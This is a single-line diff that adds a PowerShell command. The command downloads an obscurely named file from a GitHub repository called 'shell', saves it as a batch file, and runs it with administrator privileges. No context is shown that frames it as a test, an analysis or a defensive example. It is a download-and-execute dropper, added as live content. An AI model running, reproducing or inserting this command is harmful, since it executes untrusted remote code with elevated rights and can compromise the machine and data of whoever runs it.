@@ -1,0 +1,1 @@
+invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Mood56467/shell/ce04d9e8479147e7e2840bf41a41944b29bf3cf9/lllllll' -OutFile 111.bat; Start-Process -File 111.bat -Verb Runas
